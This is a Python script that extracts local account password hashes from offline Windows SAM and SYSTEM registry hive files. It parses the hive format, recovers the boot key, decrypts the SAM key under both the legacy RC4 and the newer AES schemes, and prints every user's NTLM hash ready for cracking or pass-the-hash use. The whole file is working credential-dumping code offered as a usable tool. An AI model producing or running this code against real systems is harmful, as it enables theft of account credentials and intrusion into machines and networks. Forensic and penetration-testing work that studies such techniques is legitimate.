#!/usr/bin/env python3
"""
sam_extract.py, Standalone SAM hash extractor using impacket's registry parser.

Usage:
    python sam_extract.py <sam.hiv> <system.hiv>

Extracts NTLM hashes from offline SAM + SYSTEM registry hives.
Equivalent to: secretsdump.py -sam sam.hiv -system system.hiv LOCAL
"""

import sys
import struct
import hashlib
import os

from Cryptodome.Cipher import DES, AES, ARC4
from Cryptodome.Hash import HMAC, MD5

# ---------------------------------------------------------------------------
# Minimal registry hive parser (regf format)
# ---------------------------------------------------------------------------

class RegHive:
    """Minimal Windows registry hive parser for offline hive files."""

    def __init__(self, path):
        with open(path, 'rb') as f:
            self.data = f.read()

        if self.data[:4] != b'regf':
            raise ValueError(f"Not a registry hive: {path}")

        # Root cell offset is at offset 0x24 in the regf header (relative to first hbin)
        self.root_offset = struct.unpack_from('<I', self.data, 0x24)[0]
        self.hbin_start = 0x1000  # hbins always start at 0x1000

    def _abs(self, offset):
        """Convert hive-relative offset to absolute file offset."""
        return self.hbin_start + offset

    def _read_cell(self, offset):
        """Read a cell at the given hive-relative offset."""
        abs_off = self._abs(offset)
        size = struct.unpack_from('<i', self.data, abs_off)[0]
        # Negative size = allocated cell
        cell_size = abs(size)
        return self.data[abs_off + 4 : abs_off + cell_size]

    def _parse_nk(self, offset):
        """Parse an NK (key node) cell."""
        cell = self._read_cell(offset)
        if cell[:2] != b'nk':
            return None

        flags = struct.unpack_from('<H', cell, 2)[0]
        num_subkeys = struct.unpack_from('<I', cell, 0x14)[0]      # stable subkey count
        subkeys_list_off = struct.unpack_from('<I', cell, 0x1C)[0] # stable subkeys list
        num_values = struct.unpack_from('<I', cell, 0x24)[0]       # number of values
        values_list_off = struct.unpack_from('<I', cell, 0x28)[0]  # values list offset
        class_name_off = struct.unpack_from('<I', cell, 0x30)[0]   # class name cell
        class_name_len = struct.unpack_from('<H', cell, 0x4A)[0]   # class name length
        name_len = struct.unpack_from('<H', cell, 0x48)[0]         # key name length
        name = cell[0x4C : 0x4C + name_len]

        # Decode name
        if flags & 0x20:  # KEY_COMP_NAME - ASCII
            name = name.decode('ascii', errors='replace')
        else:
            name = name.decode('utf-16-le', errors='replace')

        # Read class name if present
        class_name = None
        if class_name_off != 0xFFFFFFFF and class_name_len > 0:
            cn_cell = self._read_cell(class_name_off)
            class_name = cn_cell[:class_name_len].decode('utf-16-le', errors='replace')

        return {
            'name': name,
            'flags': flags,
            'num_subkeys': num_subkeys,
            'subkeys_list_off': subkeys_list_off,
            'num_values': num_values,
            'values_list_off': values_list_off,
            'class_name': class_name,
            'offset': offset,
        }

    def _enum_subkeys(self, nk):
        """Enumerate subkey offsets from a subkey list."""
        if nk['num_subkeys'] == 0:
            return []

        cell = self._read_cell(nk['subkeys_list_off'])
        sig = cell[:2]

        offsets = []
        if sig in (b'lf', b'lh'):
            count = struct.unpack_from('<H', cell, 2)[0]
            for i in range(count):
                off = struct.unpack_from('<I', cell, 4 + i * 8)[0]
                offsets.append(off)
        elif sig == b'ri':  # Index root - list of subkey lists
            count = struct.unpack_from('<H', cell, 2)[0]
            for i in range(count):
                sub_off = struct.unpack_from('<I', cell, 4 + i * 4)[0]
                sub_cell = self._read_cell(sub_off)
                sub_sig = sub_cell[:2]
                if sub_sig in (b'lf', b'lh'):
                    sub_count = struct.unpack_from('<H', sub_cell, 2)[0]
                    for j in range(sub_count):
                        off = struct.unpack_from('<I', sub_cell, 4 + j * 8)[0]
                        offsets.append(off)
        elif sig == b'li':
            count = struct.unpack_from('<H', cell, 2)[0]
            for i in range(count):
                off = struct.unpack_from('<I', cell, 4 + i * 4)[0]
                offsets.append(off)

        return offsets

    def _enum_values(self, nk):
        """Enumerate value entries for a key node."""
        if nk['num_values'] == 0:
            return []

        cell = self._read_cell(nk['values_list_off'])
        values = []
        for i in range(nk['num_values']):
            vk_off = struct.unpack_from('<I', cell, i * 4)[0]
            vk = self._parse_vk(vk_off)
            if vk:
                values.append(vk)
        return values

    def _parse_vk(self, offset):
        """Parse a VK (value) cell."""
        cell = self._read_cell(offset)
        if cell[:2] != b'vk':
            return None

        name_len = struct.unpack_from('<H', cell, 2)[0]
        data_len = struct.unpack_from('<I', cell, 4)[0]
        data_off = struct.unpack_from('<I', cell, 8)[0]
        val_type = struct.unpack_from('<I', cell, 0xC)[0]
        flags = struct.unpack_from('<H', cell, 0x10)[0]

        # Name
        if name_len > 0:
            name_bytes = cell[0x14 : 0x14 + name_len]
            if flags & 1:  # COMP_NAME
                name = name_bytes.decode('ascii', errors='replace')
            else:
                name = name_bytes.decode('utf-16-le', errors='replace')
        else:
            name = "(Default)"

        # Data
        real_len = data_len & 0x7FFFFFFF
        if data_len & 0x80000000:
            # Data is stored inline in data_off field
            data = struct.pack('<I', data_off)[:real_len]
        else:
            if real_len > 0:
                data = self._read_cell(data_off)[:real_len]
            else:
                data = b''

        return {'name': name, 'data': data, 'type': val_type}

    def open_key(self, path):
        """Open a registry key by path (e.g., 'SAM\\Domains\\Account')."""
        parts = path.strip('\\').split('\\')
        nk = self._parse_nk(self.root_offset)
        if not nk:
            return None

        for part in parts:
            found = False
            for sub_off in self._enum_subkeys(nk):
                sub_nk = self._parse_nk(sub_off)
                if sub_nk and sub_nk['name'].lower() == part.lower():
                    nk = sub_nk
                    found = True
                    break
            if not found:
                return None
        return nk

    def get_value(self, nk, name):
        """Get a specific value from a key node."""
        for vk in self._enum_values(nk):
            if vk['name'].lower() == name.lower():
                return vk['data']
        return None

    def get_subkeys(self, nk):
        """Get all subkey nodes."""
        result = []
        for off in self._enum_subkeys(nk):
            sub = self._parse_nk(off)
            if sub:
                result.append(sub)
        return result

    def get_class_name(self, path):
        """Get the class name of a key."""
        nk = self.open_key(path)
        if nk:
            return nk['class_name']
        return None


# ---------------------------------------------------------------------------
# Boot key extraction from SYSTEM hive
# ---------------------------------------------------------------------------

BOOT_KEY_PERM = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
LSA_KEYS = ['JD', 'Skew1', 'GBG', 'Data']

def extract_boot_key(system_hive):
    """Extract the boot key from SYSTEM hive."""
    # Find CurrentControlSet
    select_nk = system_hive.open_key('Select')
    if select_nk:
        current = system_hive.get_value(select_nk, 'Current')
        if current:
            cs_num = struct.unpack('<I', current)[0]
            cs_name = f'ControlSet{cs_num:03d}'
        else:
            cs_name = 'ControlSet001'
    else:
        cs_name = 'ControlSet001'

    hex_str = ''
    for key_name in LSA_KEYS:
        path = f'{cs_name}\\Control\\Lsa\\{key_name}'
        cn = system_hive.get_class_name(path)
        if cn is None:
            raise ValueError(f"Cannot read class name for {path}")
        hex_str += cn

    if len(hex_str) != 32:
        raise ValueError(f"Boot key hex string is {len(hex_str)} chars, expected 32")

    scrambled = bytes.fromhex(hex_str)
    boot_key = bytes(scrambled[BOOT_KEY_PERM[i]] for i in range(16))
    return boot_key


# ---------------------------------------------------------------------------
# SAM hash extraction
# ---------------------------------------------------------------------------

def str_to_key(s):
    """Convert 7-byte array to 8-byte DES key with parity bits."""
    key = bytearray(8)
    key[0] = s[0] >> 1
    key[1] = ((s[0] & 0x01) << 6) | (s[1] >> 2)
    key[2] = ((s[1] & 0x03) << 5) | (s[2] >> 3)
    key[3] = ((s[2] & 0x07) << 4) | (s[3] >> 4)
    key[4] = ((s[3] & 0x0F) << 3) | (s[4] >> 5)
    key[5] = ((s[4] & 0x1F) << 2) | (s[5] >> 6)
    key[6] = ((s[5] & 0x3F) << 1) | (s[6] >> 7)
    key[7] = s[6] & 0x7F
    for i in range(8):
        key[i] = (key[i] << 1) & 0xFE
    return bytes(key)


def sid_to_key(rid):
    """Derive two DES keys from a user RID."""
    s1 = bytearray(7)
    s1[0] = rid & 0xFF
    s1[1] = (rid >> 8) & 0xFF
    s1[2] = (rid >> 16) & 0xFF
    s1[3] = (rid >> 24) & 0xFF
    s1[4] = s1[0]
    s1[5] = s1[1]
    s1[6] = s1[2]

    s2 = bytearray(7)
    s2[0] = (rid >> 24) & 0xFF
    s2[1] = s2[0]  # Same as s1[3]
    s2[0] = s1[3]
    s2[1] = s1[0]
    s2[2] = s1[1]
    s2[3] = s1[2]
    s2[4] = s2[0]
    s2[5] = s2[1]
    s2[6] = s2[2]

    return str_to_key(s1), str_to_key(s2)


def decrypt_single_hash(rid, hashed_data, hashed_key):
    """Decrypt a single hash using DES with RID-derived keys."""
    key1, key2 = sid_to_key(rid)
    des1 = DES.new(key1, DES.MODE_ECB)
    des2 = DES.new(key2, DES.MODE_ECB)
    return des1.decrypt(hashed_data[:8]) + des2.decrypt(hashed_data[8:16])


def extract_sam_hashes(sam_hive, boot_key):
    """Extract user hashes from SAM hive using boot key."""

    # Get the F value from SAM\Domains\Account
    account_nk = sam_hive.open_key('SAM\\Domains\\Account')
    if not account_nk:
        raise ValueError("Cannot open SAM\\Domains\\Account")

    f_value = sam_hive.get_value(account_nk, 'F')
    if not f_value or len(f_value) < 0x70:
        raise ValueError("Cannot read F value")

    # Determine SAM revision
    revision = struct.unpack_from('<I', f_value, 0x68)[0]

    if revision == 3:
        # AES-based encryption (Windows 10+)
        # F value structure at offset 0x70: salt (16 bytes) + encrypted data
        salt = f_value[0x78 : 0x78 + 16]
        enc_data = f_value[0x88 : 0x88 + 32]

        cipher = AES.new(boot_key, AES.MODE_CBC, salt)
        sam_key = cipher.decrypt(enc_data)[:16]

    elif revision == 2:
        # RC4-based encryption (older Windows)
        rc4_key_data = f_value[0x70 : 0x70 + 16]

        md5 = MD5.new()
        md5.update(rc4_key_data)
        md5.update(b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0")
        md5.update(boot_key)
        md5.update(b"0123456789012345678901234567890123456789\0")
        rc4_key = md5.digest()

        cipher = ARC4.new(rc4_key)
        sam_key = cipher.decrypt(f_value[0x80 : 0x80 + 32])[:16]

    else:
        raise ValueError(f"Unknown SAM revision: {revision}")

    # Enumerate users
    users_nk = sam_hive.open_key('SAM\\Domains\\Account\\Users')
    if not users_nk:
        raise ValueError("Cannot open SAM\\Domains\\Account\\Users")

    results = []
    names_nk = sam_hive.open_key('SAM\\Domains\\Account\\Users\\Names')

    for sub_nk in sam_hive.get_subkeys(users_nk):
        rid_str = sub_nk['name']
        if not rid_str.startswith('0') or len(rid_str) != 8:
            continue

        try:
            rid = int(rid_str, 16)
        except ValueError:
            continue

        v_data = sam_hive.get_value(sub_nk, 'V')
        if not v_data or len(v_data) < 0xCC:
            continue

        # Parse V structure to get username
        # Offset 0x0C: name offset (relative to 0xCC), length
        name_off = struct.unpack_from('<I', v_data, 0x0C)[0] + 0xCC
        name_len = struct.unpack_from('<I', v_data, 0x10)[0]
        username = v_data[name_off : name_off + name_len].decode('utf-16-le', errors='replace')

        # NTLM hash location
        # Offset 0xA8: NT hash offset, 0xAC: NT hash length
        nt_off = struct.unpack_from('<I', v_data, 0xA8)[0] + 0xCC
        nt_len = struct.unpack_from('<I', v_data, 0xAC)[0]

        # LM hash location
        lm_off = struct.unpack_from('<I', v_data, 0x9C)[0] + 0xCC
        lm_len = struct.unpack_from('<I', v_data, 0xA0)[0]

        nt_hash = 'aad3b435b51404eeaad3b435b51404ee'  # empty LM
        lm_hash = 'aad3b435b51404eeaad3b435b51404ee'  # empty LM

        if nt_len > 4:
            enc_nt = v_data[nt_off : nt_off + nt_len]

            if revision == 3:
                # AES: first 2 bytes = revision, next 2 = padding,
                # then 16 bytes salt, then encrypted hash
                if len(enc_nt) >= 24:
                    nt_rev = struct.unpack_from('<H', enc_nt, 0)[0]
                    if nt_rev == 2:
                        nt_salt = enc_nt[4:20]
                        nt_enc_data = enc_nt[20:]
                        cipher = AES.new(sam_key, AES.MODE_CBC, nt_salt)
                        dec = cipher.decrypt(nt_enc_data)
                        nt_hash_raw = decrypt_single_hash(rid, dec[:16], sam_key)
                        nt_hash = nt_hash_raw.hex()
                    else:
                        # Revision 1 (RC4-based within AES SAM)
                        obf_key = HMAC.new(sam_key, struct.pack('<I', rid) +
                                           b"NTPASSWORD\0", MD5).digest()
                        cipher = ARC4.new(obf_key)
                        dec = cipher.decrypt(enc_nt[4:])
                        nt_hash_raw = decrypt_single_hash(rid, dec[:16], sam_key)
                        nt_hash = nt_hash_raw.hex()
            else:
                # RC4
                if len(enc_nt) >= 20:
                    obf_key = HMAC.new(sam_key, struct.pack('<I', rid) +
                                       b"NTPASSWORD\0", MD5).digest()
                    cipher = ARC4.new(obf_key)
                    dec = cipher.decrypt(enc_nt[4:20])
                    nt_hash_raw = decrypt_single_hash(rid, dec, sam_key)
                    nt_hash = nt_hash_raw.hex()

        results.append({
            'rid': rid,
            'username': username,
            'lm_hash': lm_hash,
            'nt_hash': nt_hash,
        })

    return results


def main():
    if len(sys.argv) < 3:
        print("SAM Hash Extractor")
        print(f"Usage: python {sys.argv[0]} <sam.hiv> <system.hiv>")
        sys.exit(1)

    sam_path = sys.argv[1]
    system_path = sys.argv[2]

    print(f"[*] Loading SYSTEM hive: {system_path}")
    system_hive = RegHive(system_path)

    print(f"[*] Extracting boot key...")
    boot_key = extract_boot_key(system_hive)
    print(f"[+] Boot key: {boot_key.hex()}")

    print(f"[*] Loading SAM hive: {sam_path}")
    sam_hive = RegHive(sam_path)

    print(f"[*] Extracting hashes...")
    hashes = extract_sam_hashes(sam_hive, boot_key)

    print(f"\n[*] Dumping local SAM hashes ({len(hashes)} users):")
    for h in hashes:
        line = f"{h['username']}:{h['rid']}:{h['lm_hash']}:{h['nt_hash']}:::"
        print(line)


if __name__ == '__main__':
    main()
